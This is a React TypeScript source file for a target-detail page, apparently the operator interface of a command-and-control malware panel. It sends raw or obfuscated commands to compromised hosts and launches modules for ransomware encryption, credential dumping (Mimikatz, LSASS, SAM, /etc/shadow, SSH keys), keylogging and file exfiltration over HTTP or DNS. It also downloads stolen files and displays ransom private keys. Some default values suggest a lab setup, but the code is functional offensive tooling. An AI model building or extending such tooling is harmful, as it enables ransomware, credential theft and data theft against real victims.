import React, { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { useSelector } from "react-redux";
import {
  fetchTarget,
  fetchCommands,
  sendCommand,
  sendModuleCommand,
  fetchTargetKeys,
  toggleTargetStatus,
  clearSelected,
} from "../../store/slices/targetsSlice";
import { useAppDispatch } from "../../hooks/useAppDispatch";
import type { RootState } from "../../store/store";

const MODULES = [
  { value: "cryptolocker", label: "CryptoLocker" },
  { value: "netscan", label: "Network Scan" },
  { value: "creddump", label: "Credential Dump" },
  { value: "exfil", label: "Exfiltration" },
  { value: "keylogger", label: "Keylogger" },
];

const POLL_INTERVAL_MS = 5000;

const TargetDetail: React.FC = () => {
  const { targetId } = useParams<{ targetId: string }>();
  const dispatch = useAppDispatch();
  const { selected, commandHistory, keys } = useSelector(
    (state: RootState) => state.targets
  );

  const [commandInput, setCommandInput] = useState("");
  const [obfuscate, setObfuscate] = useState(false);
  const [expandedCmd, setExpandedCmd] = useState<string | null>(null);

  // Module form state
  const [moduleName, setModuleName] = useState("netscan");
  const [moduleObfuscate, setModuleObfuscate] = useState(false);
  const [targetDir, setTargetDir] = useState("/tmp/test");
  const [fileExts, setFileExts] = useState(".txt,.pdf");
  const [scanTarget, setScanTarget] = useState("127.0.0.1");
  const [scanPorts, setScanPorts] = useState("22,80,443,8080");
  const [scanTimeout, setScanTimeout] = useState("500");
  const [dumpMethod, setDumpMethod] = useState("all");
  const [mimikatzUrl, setMimikatzUrl] = useState("");
  const [exfilDir, setExfilDir] = useState("/tmp");
  const [exfilExts, setExfilExts] = useState("");
  const [exfilTransport, setExfilTransport] = useState("http");
  const [exfilC2, setExfilC2] = useState("127.0.0.1:8000");
  const [exfilDns, setExfilDns] = useState("exfil.lab.local");
  const [exfilEncryption, setExfilEncryption] = useState("aes");
  const [klDuration, setKlDuration] = useState("60");
  const [klOutputMode, setKlOutputMode] = useState("stdout");

  const [showKeys, setShowKeys] = useState(false);
  const [exfilFiles, setExfilFiles] = useState<any[]>([]);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    if (targetId) {
      dispatch(fetchTarget(targetId));
      dispatch(fetchCommands(targetId));
    }
    return () => {
      dispatch(clearSelected());
    };
  }, [dispatch, targetId]);

  // Auto-poll when there are pending/sent commands
  useEffect(() => {
    const hasPending = commandHistory.some(
      (c) => c.status === "pending" || c.status === "sent"
    );

    if (hasPending && targetId) {
      pollRef.current = setInterval(() => {
        dispatch(fetchCommands(targetId));
      }, POLL_INTERVAL_MS);
    }

    return () => {
      if (pollRef.current) {
        clearInterval(pollRef.current);
        pollRef.current = null;
      }
    };
  }, [commandHistory, dispatch, targetId]);

  const handleSendCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commandInput.trim() || !targetId) return;
    dispatch(
      sendCommand({ targetId, payload: { command: commandInput, obfuscate } })
    );
    setCommandInput("");
  };

  const handleSendModule = (e: React.FormEvent) => {
    e.preventDefault();
    if (!targetId) return;

    let params: Record<string, any> = {};
    if (moduleName === "cryptolocker") {
      params = {
        target_directory: targetDir,
        file_extensions: fileExts
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean),
      };
    } else if (moduleName === "netscan") {
      params = {
        scan_target: scanTarget,
        ports: scanPorts
          .split(",")
          .map((s) => parseInt(s.trim(), 10))
          .filter((n) => !isNaN(n)),
        timeout_ms: parseInt(scanTimeout, 10) || 500,
      };
    } else if (moduleName === "creddump") {
      params = {
        method: dumpMethod,
        ...(mimikatzUrl ? { mimikatz_url: mimikatzUrl } : {}),
      };
    } else if (moduleName === "exfil") {
      params = {
        target_directory: exfilDir,
        file_extensions: exfilExts
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean),
        transport: exfilTransport,
        c2_server: exfilC2,
        dns_domain: exfilDns,
        encryption: exfilEncryption,
      };
    } else if (moduleName === "keylogger") {
      params = {
        duration: parseInt(klDuration, 10) || 60,
        output_mode: klOutputMode,
      };
    }

    dispatch(
      sendModuleCommand({
        targetId,
        payload: { module_name: moduleName, obfuscate: moduleObfuscate, params },
      })
    );
  };

  const handleToggleStatus = () => {
    if (!targetId || !selected) return;
    const newStatus = selected.status === "inactive" ? "active" : "inactive";
    dispatch(toggleTargetStatus({ targetId, newStatus }));
  };

  const handleShowKeys = () => {
    if (targetId) {
      dispatch(fetchTargetKeys(targetId));
      setShowKeys(true);
    }
  };

  const fetchExfilFiles = async () => {
    if (!targetId) return;
    try {
      const response = await fetch(`/api/v1/targets/${targetId}/exfil`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });
      if (response.ok) {
        const files = await response.json();
        setExfilFiles(files);
      }
    } catch (error) {
      console.error('Failed to fetch exfil files:', error);
    }
  };

  const downloadExfilFile = (filename: string) => {
    if (!targetId) return;
    const token = localStorage.getItem('token');
    window.open(`/api/v1/targets/${targetId}/exfil/${encodeURIComponent(filename)}/download?token=${token}`, '_blank');
  };

  const handleDeleteTarget = async () => {
    if (!targetId || !selected) return;

    const confirmDelete = window.confirm(
      `Are you sure you want to PERMANENTLY DELETE target "${selected.hostname}" (${selected.ip_address})?\n\n` +
      `This will delete:\n` +
      `- The target record\n` +
      `- All command history\n` +
      `- All stored encryption keys\n` +
      `- All exfiltrated data\n\n` +
      `This action CANNOT be undone!`
    );

    if (!confirmDelete) return;

    try {
      const response = await fetch(`/api/v1/targets/${targetId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Target deleted successfully!\n\nDeleted:\n- ${result.deleted_commands} commands\n- ${result.deleted_keys} encryption keys`);
        // Navigate back to targets list
        window.location.href = '/';
      } else {
        const error = await response.json();
        alert(`Failed to delete target: ${error.detail}`);
      }
    } catch (error) {
      console.error('Failed to delete target:', error);
      alert('Failed to delete target. Please try again.');
    }
  };

  const handleRefresh = () => {
    if (targetId) dispatch(fetchCommands(targetId));
  };

  const statusColor = (s: string) => {
    if (s === "completed") return "#66bb6a";
    if (s === "sent") return "#ffa726";
    return "#888";
  };

  if (!selected) return <p>Loading target...</p>;

  return (
    <div>
      <h2>Target: {selected.hostname}</h2>
      <dl>
        <dt>ID</dt>
        <dd>{selected.id}</dd>
        <dt>IP Address</dt>
        <dd>{selected.ip_address}</dd>
        <dt>Status</dt>
        <dd style={{ display: "flex", alignItems: "center", gap: "0.75rem" }}>
          <span style={{ color: selected.status === "active" ? "#66bb6a" : "#ef5350" }}>
            {selected.status}
          </span>
          <button
            className="btn-secondary"
            onClick={handleToggleStatus}
            style={{ padding: "0.2rem 0.6rem", fontSize: "0.8rem", marginRight: "0.5rem" }}
          >
            {selected.status === "inactive" ? "Activate" : "Deactivate"}
          </button>
          <button
            className="btn-danger"
            onClick={handleDeleteTarget}
            style={{ padding: "0.2rem 0.6rem", fontSize: "0.8rem" }}
          >
            Delete Target
          </button>
        </dd>
      </dl>

      <h3>Send Raw Command</h3>
      <form onSubmit={handleSendCommand} style={{ marginBottom: "1.5rem" }}>
        <input
          type="text"
          value={commandInput}
          onChange={(e) => setCommandInput(e.target.value)}
          placeholder="Enter command..."
        />
        <label className="checkbox-label">
          <input
            type="checkbox"
            checked={obfuscate}
            onChange={(e) => setObfuscate(e.target.checked)}
          />
          Obfuscate
        </label>
        <button type="submit">Send</button>
      </form>

      <h3>Send Module Command</h3>
      <form onSubmit={handleSendModule} className="module-form">
        <div className="form-row">
          <label>Module</label>
          <select value={moduleName} onChange={(e) => setModuleName(e.target.value)}>
            {MODULES.map((m) => (
              <option key={m.value} value={m.value}>
                {m.label}
              </option>
            ))}
          </select>
          <label className="checkbox-label">
            <input
              type="checkbox"
              checked={moduleObfuscate}
              onChange={(e) => setModuleObfuscate(e.target.checked)}
            />
            Obfuscate
          </label>
        </div>

        {moduleName === "cryptolocker" && (
          <div className="form-row">
            <label>Target Directory</label>
            <input type="text" value={targetDir} onChange={(e) => setTargetDir(e.target.value)} />
            <label>File Extensions (comma-separated)</label>
            <input type="text" value={fileExts} onChange={(e) => setFileExts(e.target.value)} />
          </div>
        )}

        {moduleName === "netscan" && (
          <div className="form-row">
            <label>Scan Target IP</label>
            <input type="text" value={scanTarget} onChange={(e) => setScanTarget(e.target.value)} />
            <label>Ports (comma-separated)</label>
            <input type="text" value={scanPorts} onChange={(e) => setScanPorts(e.target.value)} />
            <label>Timeout (ms)</label>
            <input
              type="text"
              value={scanTimeout}
              onChange={(e) => setScanTimeout(e.target.value)}
              style={{ width: "80px" }}
            />
          </div>
        )}

        {moduleName === "creddump" && (
          <div className="form-row">
            <label>Method</label>
            <select value={dumpMethod} onChange={(e) => setDumpMethod(e.target.value)}>
              <option value="all">All</option>
              <option value="mimikatz">Mimikatz (Win)</option>
              <option value="sam">SAM Dump (Win)</option>
              <option value="lsass">LSASS Dump (Win)</option>
              <option value="shadow">/etc/shadow (Linux)</option>
              <option value="memory">Proc Memory (Linux)</option>
              <option value="ssh_keys">SSH Keys (Linux)</option>
            </select>
            <label>Mimikatz URL (optional, Windows)</label>
            <input
              type="text"
              value={mimikatzUrl}
              onChange={(e) => setMimikatzUrl(e.target.value)}
              placeholder="https://host/Invoke-Mimikatz.ps1"
            />
          </div>
        )}

        {moduleName === "keylogger" && (
          <div className="form-row">
            <label>Duration (seconds)</label>
            <input
              type="text"
              value={klDuration}
              onChange={(e) => setKlDuration(e.target.value)}
              style={{ width: "80px" }}
            />
            <label>Output Mode</label>
            <select value={klOutputMode} onChange={(e) => setKlOutputMode(e.target.value)}>
              <option value="stdout">Stdout (via C2)</option>
              <option value="file">File (on target)</option>
            </select>
          </div>
        )}

        {moduleName === "exfil" && (
          <>
            <div className="form-row">
              <label>Target Directory</label>
              <input type="text" value={exfilDir} onChange={(e) => setExfilDir(e.target.value)} />
              <label>File Extensions (empty = all)</label>
              <input
                type="text"
                value={exfilExts}
                onChange={(e) => setExfilExts(e.target.value)}
                placeholder=".txt,.pdf,.docx"
              />
            </div>
            <div className="form-row">
              <label>Transport</label>
              <select value={exfilTransport} onChange={(e) => setExfilTransport(e.target.value)}>
                <option value="http">HTTP</option>
                <option value="dns">DNS</option>
              </select>
              <label>C2 Address</label>
              <input type="text" value={exfilC2} onChange={(e) => setExfilC2(e.target.value)} />
              {exfilTransport === "dns" && (
                <>
                  <label>DNS Domain</label>
                  <input type="text" value={exfilDns} onChange={(e) => setExfilDns(e.target.value)} />
                </>
              )}
            </div>
            <div className="form-row">
              <label>Encryption</label>
              <select value={exfilEncryption} onChange={(e) => setExfilEncryption(e.target.value)}>
                <option value="none">None (base64 only)</option>
                <option value="xor">XOR + base64</option>
              </select>
            </div>
          </>
        )}

        <button type="submit">Execute Module</button>
      </form>

      <div style={{ marginTop: "2rem" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "1rem", marginBottom: "1rem" }}>
          <h3 style={{ margin: 0 }}>Command History</h3>
          <button className="btn-secondary" onClick={handleRefresh} style={{ padding: "0.25rem 0.6rem", fontSize: "0.8rem" }}>
            Refresh
          </button>
          {commandHistory.some((c) => c.status === "pending" || c.status === "sent") && (
            <span style={{ fontSize: "0.8rem", color: "#ffa726" }}>
              polling...
            </span>
          )}
        </div>

        {commandHistory.length === 0 ? (
          <p style={{ color: "#888" }}>No commands sent yet.</p>
        ) : (
          <table>
            <thead>
              <tr>
                <th>Status</th>
                <th>Command</th>
                <th>Module</th>
                <th>ID</th>
              </tr>
            </thead>
            <tbody>
              {commandHistory.map((cmd) => (
                <React.Fragment key={cmd.id}>
                  <tr
                    onClick={() => setExpandedCmd(expandedCmd === cmd.id ? null : cmd.id)}
                    style={{ cursor: "pointer" }}
                  >
                    <td>
                      <span className="status-dot" style={{ backgroundColor: statusColor(cmd.status) }} />
                      {cmd.status}
                    </td>
                    <td style={{ fontFamily: "monospace", fontSize: "0.85rem", maxWidth: "400px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {cmd.original_command || cmd.command}
                    </td>
                    <td>{cmd.module_name || "-"}</td>
                    <td style={{ fontSize: "0.75rem", color: "#888" }}>
                      {cmd.id.slice(0, 8)}
                    </td>
                  </tr>
                  {expandedCmd === cmd.id && (
                    <tr>
                      <td colSpan={4} style={{ padding: 0 }}>
                        {cmd.module_name === "exfil" ? (
                          <div style={{ padding: "1rem", borderTop: "1px solid #333" }}>
                            <div style={{ marginBottom: "0.5rem" }}>
                              <button
                                onClick={fetchExfilFiles}
                                className="btn-secondary"
                                style={{ marginBottom: "1rem" }}
                              >
                                Refresh Exfil Files
                              </button>
                            </div>
                            {exfilFiles.length > 0 ? (
                              <div>
                                <h4>Exfiltrated Files:</h4>
                                <table style={{ width: "100%", marginTop: "0.5rem" }}>
                                  <thead>
                                    <tr>
                                      <th>Filename</th>
                                      <th>Progress</th>
                                      <th>Encryption</th>
                                      <th>Status</th>
                                      <th>Action</th>
                                    </tr>
                                  </thead>
                                  <tbody>
                                    {exfilFiles.map((file, idx) => (
                                      <tr key={idx}>
                                        <td style={{ fontFamily: "monospace" }}>{file.filename}</td>
                                        <td>{file.chunks_received}/{file.total_chunks}</td>
                                        <td>{file.encryption}</td>
                                        <td>
                                          <span style={{
                                            color: file.is_complete ? "#4caf50" : "#ff9800",
                                            fontWeight: "bold"
                                          }}>
                                            {file.is_complete ? "Complete" : "Incomplete"}
                                          </span>
                                        </td>
                                        <td>
                                          {file.is_complete ? (
                                            <button
                                              onClick={() => downloadExfilFile(file.filename)}
                                              className="btn-primary"
                                              style={{ padding: "0.25rem 0.5rem", fontSize: "0.8rem" }}
                                            >
                                              Download
                                            </button>
                                          ) : (
                                            <span style={{ color: "#888", fontSize: "0.8rem" }}>
                                              Waiting for chunks...
                                            </span>
                                          )}
                                        </td>
                                      </tr>
                                    ))}
                                  </tbody>
                                </table>
                              </div>
                            ) : (
                              <p style={{ color: "#888", fontStyle: "italic" }}>
                                No exfiltrated files found. Click "Refresh Exfil Files" to check.
                              </p>
                            )}
                          </div>
                        ) : (
                          <pre style={{ margin: 0, borderRadius: 0, border: "none", borderTop: "1px solid #333" }}>
                            {cmd.output || (cmd.status === "completed" ? "(empty output)" : "Waiting for result...")}
                          </pre>
                        )}
                      </td>
                    </tr>
                  )}
                </React.Fragment>
              ))}
            </tbody>
          </table>
        )}
      </div>

      <div style={{ marginTop: "1.5rem" }}>
        <button onClick={handleShowKeys} className="btn-secondary">
          Show Encryption Keys
        </button>
        {showKeys && keys.length > 0 && (
          <div style={{ marginTop: "1rem" }}>
            <h3>Stored Keys</h3>
            {keys.map((k) => (
              <div key={k.id} className="key-card">
                <dt>Key ID</dt>
                <dd>{k.id}</dd>
                <dt>Created</dt>
                <dd>{k.created_at}</dd>
                <dt>Private Key (PEM)</dt>
                <dd>
                  <pre>{k.private_key_pem}</pre>
                </dd>
              </div>
            ))}
          </div>
        )}
        {showKeys && keys.length === 0 && (
          <p style={{ marginTop: "0.5rem", color: "#888" }}>
            No encryption keys for this target.
          </p>
        )}
      </div>
    </div>
  );
};

export default TargetDetail;
